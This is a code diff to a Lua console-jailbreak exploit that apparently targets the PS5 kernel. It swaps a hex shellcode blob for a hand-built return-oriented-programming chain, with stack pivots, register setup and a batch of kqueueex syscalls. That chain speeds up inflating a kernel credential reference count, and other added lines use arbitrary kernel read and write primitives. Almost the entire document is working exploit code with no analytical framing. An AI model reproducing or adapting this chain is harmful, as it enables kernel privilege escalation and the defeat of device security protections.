@@ -21,8 +21,6 @@ local UMTX_OP_SYSNUM      = 0x1c6
 local SYSTEM_AUTHID        = 0x4800000000010003
 local FREE_FDS_NUM      = 0x10
 
-local EXEC_SHELLCODE = "4885f6743641544989fc554889f55331db66662e0f1f8400000000000f1f400048bf00000000008000004883c30141ffd44839dd75ea5b5d415cc3c3"
-
 -- Syscall wrapper helper
 local function get_syscall_wrapper(num)
     if PLATFORM == "PS4" then
@@ -218,9 +216,7 @@ function p2jb_ps5()
     local fCpuset = func_wrap(dlsym(LIBKERNEL_HANDLE, "cpuset_setaffinity"))
     local fRtprio = func_wrap(dlsym(LIBKERNEL_HANDLE, "rtprio_thread"))
 
-    local kqueueex_addr = dlsym(LIBKERNEL_HANDLE, "__sys_kqueueex")
-    write_shellcode(SHELLCODE_BASE, EXEC_SHELLCODE)
-    local exec_ntimes = func_wrap(SHELLCODE_BASE)
+    -- Legacy shellcode burn replaced by batched ROP below (see setup_fast_burn)
 
     -- syscall wrappers for ROP chains
     local w_recvmsg = get_syscall_wrapper(0x1B)
@@ -637,7 +633,134 @@ function p2jb_ps5()
         return nil
     end
 
-    show_dialog("Stage Patience\nPlease wait for some time (~2 hours)")
+    -- =========================================================================
+    -- Batched ROP kqueueex burn (ported from Y2JB fast_kqueueex)
+    --
+    -- Y2JB achieves ~9s burn by replacing per-syscall chain rebuild with a
+    -- pre-built batched chain triggered via pwn(fake_frame). In Luac0re,
+    -- call_rop() rebuilds ~30 chain entries per call. We pre-build a chain
+    -- that does BATCH_SIZE syscalls and trigger it with call_rop_internal().
+    -- =========================================================================
+
+    local BATCH_SIZE = 80
+    local kqex_path = 0x800000000000
+    local syscall_addr = get_syscall_wrapper(0x8D)
+
+    local function write_chain(addr, val)
+        write64_unstable(addr, val)
+    end
+
+    local function build_batched_chain(batch_size)
+        local idx = 0
+        local function p(v)
+            write64_unstable(LUA_PIVOT_SCRATCH + idx * 8, v)
+            idx = idx + 1
+        end
+
+        -- 1. Save original RBP to STRING_BASE + 0x10 (same as call_rop)
+        p(POP_RCX_RET); p(STRING_BASE)
+        p(POP_RSI_RET); p(0)
+        write64_unstable(STRING_BASE, RET - STRING_BASE)
+        p(XCHG_RAX_RBP)
+        p(POP_RDI_RET); p(STRING_BASE + 0x10)
+        p(MOV_DEREF_RDI_RAX_RET)
+
+        -- 2. Setup r8 = 0, r9 = 0
+        p(POP_RBX_RET); p(STRING_BASE + 0x8)
+        p(POP_R8_RET); p(0); p(0); p(0); p(STRING_BASE + 0x70)
+        write64_unstable(STRING_BASE + 0x20, 0)
+        p(POP_RCX_RET); p(RET)
+        p(MOV_R9_RET)
+
+        -- 3. Restore RBP from STRING_BASE + 0x10
+        p(POP_RAX_RET); p(STRING_BASE + 0x10)
+        p(MOV_RAX_DEREF_RAX_RET)
+        local rbp_ph = idx + 4
+        p(POP_RDI_RET); p(LUA_PIVOT_SCRATCH + rbp_ph * 8)
+        p(MOV_DEREF_RDI_RAX_RET)
+        p(POP_RBP_RET); p(0xDEADBEEF)
+
+        -- 4. Setup kqueueex args: rax=0x8D, rdi=bad_addr, rsi=0, rdx=0, rcx=0
+        p(POP_RAX_RET); p(0x8D)
+        p(POP_RDI_RET); p(kqex_path)
+        p(POP_RSI_RET); p(0)
+        p(POP_RDX_RET); p(0)
+        p(POP_RCX_RET); p(0)
+
+        -- 5. First syscall
+        p(syscall_addr)
+
+        -- 6. Batch remaining syscalls (regs preserved across syscall; only reload rax)
+        for i = 1, batch_size - 1 do
+            p(POP_RAX_RET); p(0x8D)
+            p(syscall_addr)
+        end
+
+        -- 7. Save return value of last syscall
+        p(POP_RDI_RET); p(STRING_BASE + 0x30)
+        p(MOV_DEREF_RDI_RAX_RET)
+
+        -- 8. Restore RBP via XCHG
+        p(POP_RAX_RET); p(STRING_BASE + 0x10)
+        p(MOV_RAX_DEREF_RAX_RET)
+        p(POP_RCX_RET); p(STRING_BASE)
+        p(POP_RSI_RET); p(0)
+        p(XCHG_RAX_RBP)
+
+        -- 9. Restore R15
+        p(POP_R15_RET); p(LUA_STATE)
+
+        -- 10. Calculate original RSP = RBP - 0x48
+        p(POP_RAX_RET); p(STRING_BASE + 0x10)
+        p(MOV_RAX_DEREF_RAX_RET)
+        p(POP_RDX_RET); p(0x48)
+        p(SUB_RAX_RDX_RET)
+
+        -- 11. Patch placeholder and pop RSP
+        local rsp_ph = idx + 4
+        p(POP_RDI_RET); p(LUA_PIVOT_SCRATCH + rsp_ph * 8)
+        p(MOV_DEREF_RDI_RAX_RET)
+        p(POP_RSP_RET); p(0xDEADBEEF)
+
+        return { rbp_ph = rbp_ph, rsp_ph = rsp_ph, chain_words = idx }
+    end
+
+    local function setup_fast_burn()
+        -- Set up pivot preamble (normally done by call_rop)
+        write64_unstable(LUA_PIVOT_SCRATCH - 0x100000, 0)
+        write64_unstable(LUA_PIVOT_SCRATCH - 0x100000 + 0x48, LUA_PIVOT2)
+        write64_unstable(LUA_PIVOT_SCRATCH - 0x100000 + 0x7, LUA_PIVOT_SCRATCH)
+        write64_unstable(LUA_PIVOT_RAX, LUA_PIVOT_SCRATCH - 0x100000)
+
+        -- Build batched chain template (will be overwritten by call_rop below)
+        local chain_info = build_batched_chain(BATCH_SIZE)
+
+        -- Use call_rop(RET) once to execute a dummy chain and let it dynamically
+        -- patch its own RBP/RSP placeholders. call_rop() always writes its chain
+        -- to LUA_PIVOT_SCRATCH; its RBP placeholder is at offset 24 and RSP at 59.
+        call_rop(RET)
+
+        -- Read the patched return addresses from call_rop()'s chain layout
+        local patched_rbp = read64_unstable(LUA_PIVOT_SCRATCH + 24 * 8)
+        local patched_rsp = read64_unstable(LUA_PIVOT_SCRATCH + 59 * 8)
+
+        -- Rebuild batched chain and patch OUR placeholders with the captured values.
+        -- burn_batch() calls call_rop_internal() from the same Lua call depth, so
+        -- the return path through the Lua VM dispatcher is identical.
+        build_batched_chain(BATCH_SIZE)
+        write64_unstable(LUA_PIVOT_SCRATCH + chain_info.rbp_ph * 8, patched_rbp)
+        write64_unstable(LUA_PIVOT_SCRATCH + chain_info.rsp_ph * 8, patched_rsp)
+
+        return true
+    end
+
+    -- Fast trigger: equivalent to Y2JB's pwn(fake_frame)
+    local function burn_batch()
+        call_rop_internal()
+        return read64_unstable(STRING_BASE + 0x30)
+    end
+
+    show_dialog("Stage Patience\nBurning cr_ref (should take a few minutes)")
     local ucred = 0
     local free_fds = {}
     local free_fd_idx = 1
@@ -664,10 +787,18 @@ function p2jb_ps5()
             local ntimes_debug = 0x1000000
             local cr_ref_after_increment = cr_ref_before + ntimes - ntimes_debug
             kkwrite32(ucred, cr_ref_after_increment)
-            exec_ntimes(kqueueex_addr, ntimes_debug)
+            setup_fast_burn()
+            local batches = math.floor(ntimes_debug / BATCH_SIZE)
+            local rem = ntimes_debug % BATCH_SIZE
+            for i = 1, batches do burn_batch() end
+            for i = 1, rem do syscall.kqueueex(kqex_path, 0) end
             cr_ref_after = kkread32(ucred)
         else
-            exec_ntimes(kqueueex_addr, ntimes)
+            setup_fast_burn()
+            local batches = math.floor(ntimes / BATCH_SIZE)
+            local rem = ntimes % BATCH_SIZE
+            for i = 1, batches do burn_batch() end
+            for i = 1, rem do syscall.kqueueex(kqex_path, 0) end
         end
 
         -- Use fopen to get the rest of the cr_ref increment
